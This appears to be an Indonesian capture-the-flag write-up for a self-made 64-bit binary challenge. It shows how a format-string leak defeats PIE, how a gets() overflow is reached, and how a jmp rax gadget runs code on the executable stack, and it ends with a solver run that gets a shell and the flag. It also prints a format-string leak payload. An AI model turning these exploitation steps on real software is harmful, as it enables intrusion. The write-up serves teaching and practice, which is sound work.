# ShellPie write up

## note
chall bikin sendiri, kali ini shell dengan proteksi pie. cara nya kurang lebih sama tapi harus leak alamat dulu pake format string.

# analysis & exploit step bystep.

## leak metadata & proteksi 
```
└> file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=78fa91c5c290531d72e107ed72c40714c82c516f, for GNU/Linux 3.2.0, not stripped
└> pwn checksec chall
[*] '/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO  <---[ aktif juga tapi tidak terlalu ngaruh ]--
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled   <---[ PIE aktif jadi harus leak address nih ]--
    Stack:    Executable
    RWX:      Has RWX segments
```

```
└> ./chall

=====================================
        Layanan curhat gratis
=====================================
kenalan dulu, siapa namamu ? : orang <-- input ku
orang
sini cerita dulu : jadi gini , gimana sedih kan <-- input ku
oh gitu, apalah.
```
aku coba untuk kedua kalinya
```
=====================================
        Layanan curhat gratis
=====================================
kenalan dulu, siapa namamu ? : %p
0xa70
sini cerita dulu : %p
oh gitu, apalah.
```
sudah ku duga, jika suatu input ditulis ulang, wajib di coba kerentanan format string. ini akan berguna untuk me leak memory.

dari **GDB** aku menemukan beberapa fungsi :
- usefulGadgets
- greet
- vulnerable
- main

seperti namanya , fungsi vulnerable memiliki kerentanan . berikut hasil disassemble : 
```Assembly
Dump of assembler code for function vulnerable:
   0x000000000000122e <+0>:     endbr64
   0x0000000000001232 <+4>:     push   rbp
   0x0000000000001233 <+5>:     mov    rbp,rsp
   0x0000000000001236 <+8>:     sub    rsp,0x60
   0x000000000000123a <+12>:    lea    rax,[rip+0xe3f]        # 0x2080
   0x0000000000001241 <+19>:    mov    rdi,rax
   0x0000000000001244 <+22>:    mov    eax,0x0
   0x0000000000001249 <+27>:    call   0x10b0 <printf@plt>
   0x000000000000124e <+32>:    mov    rdx,QWORD PTR [rip+0x2dcb]        # 0x4020 <stdin@GLIBC_2.2.5>
   0x0000000000001255 <+39>:    lea    rax,[rbp-0x20]
   0x0000000000001259 <+43>:    mov    esi,0x1f
   0x000000000000125e <+48>:    mov    rdi,rax
   0x0000000000001261 <+51>:    call   0x10c0 <fgets@plt>
   0x0000000000001266 <+56>:    lea    rax,[rbp-0x20]
   0x000000000000126a <+60>:    mov    rdi,rax
   0x000000000000126d <+63>:    mov    eax,0x0
   0x0000000000001272 <+68>:    call   0x10b0 <printf@plt>
   0x0000000000001277 <+73>:    lea    rax,[rip+0xe22]        # 0x20a0
   0x000000000000127e <+80>:    mov    rdi,rax
   0x0000000000001281 <+83>:    mov    eax,0x0
   0x0000000000001286 <+88>:    call   0x10b0 <printf@plt>
   0x000000000000128b <+93>:    mov    rax,QWORD PTR [rip+0x2d7e]        # 0x4010 <stdout@GLIBC_2.2.5>
   0x0000000000001292 <+100>:   mov    rdi,rax
   0x0000000000001295 <+103>:   call   0x10e0 <fflush@plt>
   0x000000000000129a <+108>:   lea    rax,[rbp-0x60]
   0x000000000000129e <+112>:   mov    rdi,rax
   0x00000000000012a1 <+115>:   mov    eax,0x0
   0x00000000000012a6 <+120>:   call   0x10d0 <gets@plt>
   0x00000000000012ab <+125>:   nop
   0x00000000000012ac <+126>:   leave
   0x00000000000012ad <+127>:   ret
End of assembler dump.
```

lihat, ada 2 fungsi input yaitu **fgets** (vulnerable+51) , dan **gets** (vulnerable+120). jika input pertama adalah nama, maka input kedua adalah curhatan. 

terlepas dari itu input kedua ternyata menggunakan fungsi yang SANGAT rentan dengan buffer overflow. fungsi gets. fungsi tersebut memungkinkan user menginput tanpa batas.
literaly tanpa batas. sampai binary meletup pun fungsi ini akan tetap menerima input.

karena berbahaya bahkan compiler akan memberikan peringatan ketika seorang programmer yang mengcompile program yang memanggil fungsi ini. kabar baiknya ini akan jadi jalan masuk
untuk rop chain yang sempurna. 

selanjutnya adalah mengecek apakah aku bisa memanggil stack lewat rax lagi, aku lanjutkan analisis dengan gdb.

`pasang breakpoint setelah fungsi gets()`
```
pwndbg> b *vulnerable+126
Breakpoint 1 at 0x12ac
pwndbg> r
Starting program: /home/rotalactf/reno/pwn/project/shellcoding/pieshell/chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

=====================================
        Layanan curhat gratis
=====================================
kenalan dulu, siapa namamu ? : SHINOBU
SHINOBU
sini cerita dulu : IWAKIWAK
```
kebetulan aku menggunakan gdb dengan plugin pwndbg jadi meihat kondisi binary akan jauh lebih mudah.
```
Breakpoint 1, 0x00005555555552ac in vulnerable ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────
 RAX  0x7fffffffdcb0 ◂— 'IWAKIWAK' 
```
lihat kan? rax menyimpan alamat memory yang menunjuk ke string IWAKIWAK. string itu kan ada di stack. jadi alamat yang disimpan rax adalah stack. namun untuk melakukan jump ke 
stack tentu butuh gadget. gadget nya adalah `jmp rax` yang bisa di dapatkan dengan mudah pakai tools ROPgadget
```
└> ROPgadget --binary ./chall | grep "jmp rax"
```
result:
```Assembly
0x000000000000114f : jmp rax
```
instruksi yang bersih, hanya mengeksekusi jmp rax , : **0x114f**


namun belum, alamat yang di dapat oleh gadget itu adalah alamat statis , sedangkan program memiliki PIE. aku harus mencari base address dari binary dengan me leak nya pakai
input nama tadi. lalu menghitung alamat asli gadget dengan offsetnya.  

akan lebih mudah dipahami sambil jalan.

kebetulan aku punya tools bernama **see.py** yang bisa melakukan leak dalam hitungan detik, masih dalam pembangunan tapi sudah cukup keren. kayanya.

```
└> python3 see.py
==================================================
  TIPE         INDEX               ADDRESS
==================================================
  start input    1              0x2542424242414141  b'%BBBBAAA'
  start input    3              0xa70243325424242   b'\np$3%BBB'
  start input    14             0x4242424241414141  b'BBBBAAAA'
  Main           25             0x5d1cda60f2ae
  BASE (calc)    -              0x5d1cda60e000
==================================================
FORMAT STRING PAYLOAD  :
.%1$p.%3$p.%14$p.%25$p
==================================================
```

got it. main ada di index ke 25. aku belum menghubungkan ini ke solver jadi aku akan lakukan manual, atleast aku bisa tau lokasi main memory dengan cepat.

rumus base address adalah **base = leaked_addr - static_addr** static_addr itu bisa dari elf.sym[] dan gdb .

setelah data nya kumiliki tinggal rakit [skrip](solver.py) python

```
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/project/shellcoding/pieshell/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process '/home/rotalactf/reno/pwn/project/shellcoding/pieshell/chall': pid 39514
[*] Switching to interactive mode
 THPCTF{sh3llc0d3_3x3cut10n_v14_st4ck_0v3rfl0w}
$ ls
README.md  chall  flag.txt  see.py  solver.py
$
```
welldone with gokil . apaan dah

flag : ** THPCTF{sh3llc0d3_3x3cut10n_v14_st4ck_0v3rfl0w}**
